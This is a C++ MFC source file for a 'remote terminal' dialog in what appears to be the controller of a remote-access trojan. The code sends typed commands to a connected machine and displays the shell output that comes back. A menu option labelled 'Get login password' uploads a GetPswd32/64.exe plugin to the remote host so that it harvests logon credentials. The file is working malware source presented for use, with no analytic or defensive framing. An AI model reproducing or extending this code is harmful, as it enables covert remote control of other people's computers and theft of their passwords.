// ShellDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "ShellDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define IDM_GET_SYSPSWD		0x0010

/////////////////////////////////////////////////////////////////////////////
// CShellDlg dialog


CShellDlg::CShellDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CShellDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CShellDlg)
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_nCurSel		= 0;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SHELL));
	m_bCanKill		= TRUE;
	
	if (strcmp((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1), "x32") == 0)
		m_bIs32Bit	= TRUE;
	else
		m_bIs32Bit	= FALSE;
}


void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CShellDlg)
	DDX_Control(pDX, IDC_EDIT, m_edit);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
	//{{AFX_MSG_MAP(CShellDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_EN_CHANGE(IDC_EDIT, OnChangeEdit)
	ON_WM_CTLCOLOR()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CShellDlg message handlers

BOOL CShellDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit.m_hWnd)
		{
			int	len = m_edit.GetWindowTextLength();
			CString str;
			m_edit.GetWindowText(str);
			str += "\r\n";
			m_iocpServer->Send(m_pContext, (LPBYTE)str.GetBuffer(0) + m_nCurSel, str.GetLength() - m_nCurSel);
			m_nCurSel = m_edit.GetWindowTextLength();
		}
		if (pMsg->wParam == 'C' && HIBYTE(GetKeyState(VK_CONTROL)) && m_bCanKill)
		{
			BYTE bEvent = CTRL_C_EVENT;
			m_iocpServer->Send(m_pContext, &bEvent, sizeof(bEvent));
			m_bCanKill = FALSE;
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
		{
			if (m_edit.GetWindowTextLength() <= m_nReceiveLength)
				return true;
		}
 	}
	// Ctrl没按下
	if (pMsg->message == WM_CHAR && !HIBYTE(GetKeyState(VK_CONTROL)))
	{
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		// 用户删除了部分内容，改变m_nCurSel
		if (len < m_nCurSel)
			m_nCurSel = len;
	}

	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CShellDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_SYSPSWD, "获取登录密码(&P)");
	}

	m_nCurSel = m_edit.GetWindowTextLength();

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 远程终端", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CShellDlg::OnReceiveComplete()
{
	if (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0] == CTRL_C_EVENT)
	{
		m_bCanKill = TRUE;
		return;
	}
	if (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0] == 6)
	{
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		m_edit.ReplaceSel("获取密码中, 请稍候......\r\n");
		GetSystemPassword(2);
		return;
	}
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}

void CShellDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	switch (nID)
	{
	case IDM_GET_SYSPSWD:
		GetSystemPassword(1);
		break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}

void CShellDlg::GetSystemPassword(UINT nID)
{
	CString strGetPswdFile;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwSize = 0, dwRead;
	LPBYTE	lpBuffer = NULL;
	
	if (nID == 1)
	{
		BYTE bTokenKill = 5;
		m_iocpServer->Send(m_pContext, &bTokenKill, 1);
		return;
	}
	
	if (m_bIs32Bit)
		strGetPswdFile.Format("%s\\Plugins\\%s", ((CClientApp *)AfxGetApp())->AppPath, "GetPswd32.exe");
	else
		strGetPswdFile.Format("%s\\Plugins\\%s", ((CClientApp *)AfxGetApp())->AppPath, "GetPswd64.exe");
	
	hFile = CreateFile(strGetPswdFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		CString strText;
		strText.Format("文件缺失[%s]", strGetPswdFile);
		MessageBox(strText, "警告", MB_ICONWARNING);
		return;
	}
	dwSize = GetFileSize(hFile, NULL);
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + dwSize);
	lpBuffer[0] = 5;
	if (!ReadFile(hFile, (void *)&lpBuffer[1], dwSize, &dwRead, NULL))
	{
		LocalFree(lpBuffer);
		CloseHandle(hFile);
		return;
	}
	CloseHandle(hFile);
	m_iocpServer->Send(m_pContext, lpBuffer, 1 + dwSize);
	LocalFree(lpBuffer);
}

void CShellDlg::AddKeyBoardData()
{
	// 最后填上0
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	
//	strResult.Replace("\n", "\r\n");
	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel(strResult);
	m_nCurSel = m_edit.GetWindowTextLength();
}

void CShellDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);	
	DestroyWindow();
}

void CShellDlg::ResizeEdit()
{
	RECT	rectClient;
	RECT	rectEdit;
	if (!m_edit.GetSafeHwnd())
		return;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit.MoveWindow(&rectEdit);
}

void CShellDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	ResizeEdit();
}

void CShellDlg::OnChangeEdit() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	// 用户删除了部分内容，改变m_nCurSel
	int len = m_edit.GetWindowTextLength();
	if (len < m_nCurSel)
		m_nCurSel = len;
}

HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(190, 190, 190);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}

void CShellDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}
